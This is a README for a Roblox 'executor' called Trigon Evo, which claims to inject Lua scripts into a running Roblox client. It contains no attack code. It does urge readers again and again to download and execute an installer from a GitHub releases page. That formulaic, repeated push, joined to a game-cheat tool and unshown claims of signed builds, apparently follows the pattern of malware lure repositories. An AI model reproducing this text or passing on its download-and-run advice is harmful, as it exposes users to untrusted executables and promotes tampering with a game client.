# Trigon Evo — Fast Roblox Lua IDE & Executor for Windows 8-11 🚀

[![Release](https://img.shields.io/github/v/release/Mu2233/Trigon-Evo?label=Release&color=blue)](https://github.com/Mu2233/Trigon-Evo/releases)

Trigon Evo is a focused Roblox Lua IDE and executor built for developers and testers who work on Roblox scripts. It runs on Windows 8, 8.1, 10, and 11. The project targets wide compatibility and rapid updates. New releases appear within 1–24 hours after major Roblox changes, which typically happen each Wednesday. Download the release file from the link above and execute the delivered file to install or run Trigon Evo.

![Trigon Evo banner](https://img.shields.io/badge/Trigon-Evo-Lua-blue)

Table of contents
- Features
- Quick download and install
- First run and quick start
- Editor and executor overview
- Script workspace and project layout
- Supported APIs and runtime surface
- Example scripts
- Debugging and logging
- Performance and stability tips
- Update policy and release schedule
- Releases and download (action required)
- Troubleshooting
- FAQ
- Roadmap
- Contributing
- Security and safe usage
- License
- Credits and resources
- Contact

Features ✨
- Full Lua editing surface with syntax highlight for Roblox Lua.
- Built-in executor that runs standard Lua and common Roblox API calls.
- Tabbed editor with file tree, search, and multi-cursor support.
- Live output console for print, errors, and custom logging.
- Breakpoint-style execution markers and step control.
- Quick injection targets for local Roblox client sessions.
- Script manager with profiles and workspace snapshots.
- Support for Lua modules and module loaders.
- Auto-update system that reacts to Roblox updates within the stated window.
- Windows 8–11 compatible, with both x86 and x64 builds where relevant.
- Lightweight and optimized for low memory footprint.

Quick download and install ▶️
- Visit the releases page and download the release file linked there:
  https://github.com/Mu2233/Trigon-Evo/releases
- Since the link contains a path to releases, you must download the provided release file and execute it on your Windows system.
- The release entry usually contains an installer (EXE) or a portable ZIP. Choose the file that matches your needs, download it, and run the executable to install.
- After install, launch Trigon Evo from the Start menu or the installed folder.

Release badge and download quick link
[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen)](https://github.com/Mu2233/Trigon-Evo/releases)

First run and quick start 🏁
- Launch Trigon Evo from the Start menu.
- The UI opens to a default workspace. You will see the editor on the left and the console at the bottom.
- Create a new file (Ctrl+N). Name it with a .lua extension.
- Type a simple test:
  local part = Instance.new("Part")
  part.Name = "TestPart"
  print("Hello from Trigon Evo")
- Save the file (Ctrl+S). Use the run button (play icon) to execute. Output appears in the console.
- Use the built-in sample projects to explore common patterns. The sample projects live in the project template folder, accessible from File > New Project.

Editor and executor overview 🛠️
Editor features
- Syntax highlight for Lua and Roblox API.
- Auto-complete for common API names and Instance types.
- Indentation and bracket pairing.
- Search and replace with regex support.
- Multi-tab editing and split view.
- File tree with drag-and-drop.

Executor features
- Run single file or whole project.
- Attach to a local Roblox client session if present.
- Sandbox execution by default with a controlled global environment.
- Option for an expanded environment when testing in a local dev instance.
- Live console for print and error capture.
- Step controls: Run, Pause, Step Over, Step Into, Stop.

Script workspace and project layout 📁
Trigon Evo organizes code into projects. Each project contains:
- main.lua — The entry script.
- modules/ — Folder for ModuleScripts and reusable code.
- assets/ — Media assets, configuration files.
- scripts/ — Misc scripts and test stubs.
- config.json — Project metadata and run config.

Project layout example
- my-project/
  - main.lua
  - modules/
    - utilities.lua
  - assets/
    - logo.png
  - config.json

You can import or export projects as .zip. The project manager supports snapshots to save state at a point in time. Use snapshots when you test complex interactions and want to revert quickly.

Supported APIs and runtime surface 📡
Trigon Evo aims to provide a realistic testing surface for Roblox Lua code. Key points:
- It exposes a common subset of Roblox services and Instances in the testing sandbox.
- It includes mock services for Workspace, Players, ReplicatedStorage, and more.
- The executor can attach to an actual Roblox client instance when present to allow live testing.
- The environment uses a sandbox table where global functions like print are redirected to the console.
- ModuleScript loader supports require with local module caching.

Core supported services (mocked by default)
- workspace
- game
- Players
- ReplicatedStorage
- RunService (mock hooks)
- HttpService (mock with toggles)
- Telemetry hooks for profiling and runtime metrics

Attachment mode
- When Trigon Evo detects a running Roblox client, it offers an attachment mode. In this mode, the executor connects to the local client and issues commands that run in the live client process where allowed. Attachment mode requires the appropriate local client setup and the app permissions that Trigon Evo requests during installation.

Example scripts 📜
1) Simple print and object creation (safe)
main.lua
local part = Instance.new("Part")
part.Name = "DebugPart"
print("Created part:", part.Name)

2) Module and require usage
modules/utilities.lua
local M = {}
function M.add(a, b)
  return a + b
end
return M

main.lua
local utils = require(script.Parent.modules.utilities)
print("Sum:", utils.add(2, 3))

3) Event and basic callback (mocked RunService)
main.lua
RunService.Heartbeat:Connect(function(dt)
  print("Heartbeat:", dt)
end)

Use these examples to validate the editor and console. Trigon Evo tracks function calls and prints with timestamps for easier correlation.

Debugging and logging 🔍
- Use the console for prints and stack traces.
- The debugger supports breakpoints. Click in the gutter to add or remove breakpoints.
- When a breakpoint hits, the editor highlights the current line and shows locals and globals in the debug pane.
- Use step controls to step into and over function calls.
- The log panel collects runtime messages and groups them by severity: info, warn, error.
- Logs include file and line number where possible.

Tips for effective debugging
- Keep functions small and write clear return values.
- Use structured print with labels:
  print("[PlayerState] pos:", player.Position)
- Use snapshots to record project state before a test run.

Performance and stability tips ⚙️
- Close unused tabs to free memory.
- Use modules to keep code modular and manageable.
- Test in small increments. Run a focused script to validate behavior before running a complex suite.
- If you use the attach mode, ensure your Roblox client is up to date.
- If the console shows repeated errors, stop the process, inspect the stack trace, and run a minimal script to narrow the issue.

Update policy and release schedule 🔁
- Trigon Evo monitors Roblox updates and publishes a compatible release within 1–24 hours after a Roblox update.
- Roblox updates commonly drop on Wednesday. The update window reflects the time needed to adapt internals and test compatibility.
- The auto-update feature can fetch a release from the Releases page. Manual download remains available.

Releases and download (action required) ⤵️
- The releases page hosts installers and portable builds. Download the correct file for your architecture from:
  https://github.com/Mu2233/Trigon-Evo/releases
- Because this link points to release artifacts, download the release file that matches your platform and execute it to install or run Trigon Evo.
- After download, run the installer or extract the ZIP. The installer guides you through setup. For portable builds, unzip and run the executable.

Release file details
- Each release entry shows a changelog and checksums for the artifacts.
- The build artifacts include:
  - TrigonEvo-Setup-x64.exe (installer)
  - TrigonEvo-Portable-x64.zip (portable)
  - TrigonEvo-Docs.zip (offline docs)
- Download and execute the appropriate file for your setup.

Troubleshooting 🛠
- The app fails to start
  - Check that you downloaded the correct architecture (x64 vs x86).
  - Re-run the installer.
  - Confirm Windows updates and dependencies, such as required runtime libraries.

- Console shows unexpected errors
  - Inspect the stack trace. Use the debugger to step through.
  - Run a minimal script to isolate the failing call.

- Attachment fails to connect to Roblox client
  - Ensure a Roblox client runs under the same user account.
  - Close other tools that may attach to the client.
  - Restart both the Roblox client and Trigon Evo.

- Auto-update does not trigger
  - Open Help > Check for updates.
  - Manual download from the Releases page works as a fallback:
    https://github.com/Mu2233/Trigon-Evo/releases

- UI performance issues
  - Disable heavy editor plugins.
  - Close background applications that use large CPU or memory.

FAQ ❓
Q: Which Windows versions does Trigon Evo support?
A: Trigon Evo supports Windows 8, 8.1, 10, and 11.

Q: How fast do you update after Roblox changes?
A: We aim to release compatibility updates within 1–24 hours after Roblox updates, which typically occur on Wednesdays.

Q: Does Trigon Evo run on macOS or Linux?
A: Official builds target Windows. Portable builds may run under compatibility layers, but we do not provide native macOS or Linux builds.

Q: Can I use Trigon Evo with version control?
A: Yes. Project folders are compatible with Git. Exclude user-specific temp files as needed.

Q: How do I report bugs?
A: Open an issue on the repository or attach a log file from Help > Export Logs.

Q: Where do I get the releases?
A: The Releases page lists installer and portable builds. Download and execute the file you need:
https://github.com/Mu2233/Trigon-Evo/releases

Roadmap 🛣️
Planned near-term items
- Plugin ecosystem for editor extensions.
- Deeper Roblox API mocks to mirror runtime behavior.
- Improved module resolution and virtual file system.
- Native x86 builds and signed installers for wider compatibility.
- Live collaboration features for pair programming.

Planned mid-term items
- Built-in profiler with flame graph output.
- Test runner for automated script validation.
- Template library for common Roblox patterns.

Planned long-term items
- Official plugin repository and community marketplace.
- Cloud project backups and sync.
- Native support for additional platforms based on demand.

Contributing 🤝
We accept contributions that improve stability, add features, fix bugs, or improve documentation.
- Fork the repo.
- Create a feature branch.
- Submit a pull request with a clear description and tests where relevant.
- For code, follow the established code style in the repository.
- For docs, follow the README layout and keep examples minimal and clear.

How to contribute code
- Clone the repo.
- Create a branch: git checkout -b feat/your-feature
- Implement your change and add tests.
- Commit with clear messages and push to your fork.
- Open a pull request describing the change and motivation.

Labels and code review
- The maintainers tag PRs with labels that describe scope: bug, enhancement, docs, breaking-change.
- Maintain a clean commit history. Squash trivial fixups.

Security and safe usage 🔐
- Trigon Evo runs user scripts. Only run code you trust.
- The executor uses a sandbox by default to isolate scripts from the host environment.
- The attach mode interfaces with a local Roblox client to allow live testing.
- The Releases page contains signed packages and checksums to help verify integrity.

Logging and diagnostics
- Trigon Evo keeps logs in the user data folder. Use Help > Export Logs to gather diagnostics for an issue.
- The logs include console output, runtime errors, and app-level events.

Offline documentation
- The Docs artifact in each release contains the full user guide, API reference, and examples. Download the docs from the releases page if you want local access.

Testing and quality ⏱️
- The test suite uses unit tests for core modules and integration tests for the executor.
- CI runs on push and pull requests. Tests include static checks and runtime scenarios in a mocked environment.
- We track test coverage and focus on high-risk parts of the codebase first.

Design and architecture 🧭
High level
- The app splits into UI, engine, runner, and mock services.
- The UI uses a native framework for performance.
- The engine hosts the Lua VM and module loader.
- The runner abstracts execution targets: sandbox and attach mode.
- Mock services provide deterministic behavior for offline testing.

Component roles
- UI: Editor, project manager, console, debug panes.
- Engine: Module loader, memory manager, runtime hooks.
- Runner: Execution control, breakpoints, stepping.
- Mocks: Service stubs for common Roblox features to avoid false negatives during tests.

Compatibility matrix
- Windows 8.1 and up for installer and runtime.
- Both x86 and x64 builds are supported where needed.
- Requirements: basic runtime libraries and network access for updates.

Internationalization 🌐
- The UI includes a locale layer. English is the default.
- Community translators maintain additional language files. Contributions to translations are welcome.

Analytics and telemetry 📊
- The app may collect basic crash reports and anonymous usage metrics by default. You can disable telemetry in settings.
- Collected data helps prioritize fixes and compatibility updates.

License 📜
- The project uses an open source license. See the LICENSE file in the repo for details.

Credits and resources 🙏
- Lua: https://www.lua.org
- GitHub Releases: https://github.com/Mu2233/Trigon-Evo/releases
- Lua community contributions for parser and tooling libraries.

Images and badges used in this README:
- Badges: img.shields.io
- Icons and logos: community assets and public domain imagery where applicable.

Contact ✉️
- Open issues on GitHub for bugs and feature requests.
- For large contributions, open a discussion or RFC in the repo.

Further reading and links
- Trigon Evo releases: https://github.com/Mu2233/Trigon-Evo/releases
- Repository issues: Use the Issues tab on the repo to file bugs and feature requests.
- Documentation: Download the Docs artifact from the Releases page or view the docs folder in the repository.

Changelog highlights (select)
- v1.6.0 — Improved module loader, added snapshot manager, optimized console.
- v1.5.1 — Fix: breakpoint handling under certain runtime states, improved stability.
- v1.5.0 — Major: attachment improvements and expanded mock services.
- v1.4.0 — UI tweaks and editor autocomplete enhancements.

Maintenance and support
- Active development tracks platform updates.
- We prioritize compatibility with Roblox core changes and release fixes in the timeframe listed above.
- For critical issues, open an issue and tag with "critical".

How to report a bug
- Attach a minimal repro project when possible.
- Include logs and a short step list to reproduce.
- Indicate OS version and build artifact used.

Developer notes
- If you plan to extend the app, read the developer guide in the docs package.
- The engine provides plugin hooks for additional editor and runner tooling.
- Unit tests use the test harness located in tests/.

Local development setup
- Clone the repo.
- Install required runtimes as documented in docs/dev-setup.md.
- Run the test harness before opening a pull request.

Community and support
- Use GitHub Discussions or the Issues tab for technical questions.
- Contribute to translations and plugin recipes.

Direct download and execution reminder
- The release page hosts executable artifacts. Download the file from the releases link and execute it to install or run Trigon Evo:
  https://github.com/Mu2233/Trigon-Evo/releases

Build and release signatures
- Releases include checksums and optional signatures. Verify the downloaded file with the provided checksum where possible.

This README documents how to get started, how to test scripts, and where to find releases and docs. The releases page contains installers and portable builds that you will need to download and execute for installation:
https://github.com/Mu2233/Trigon-Evo/releases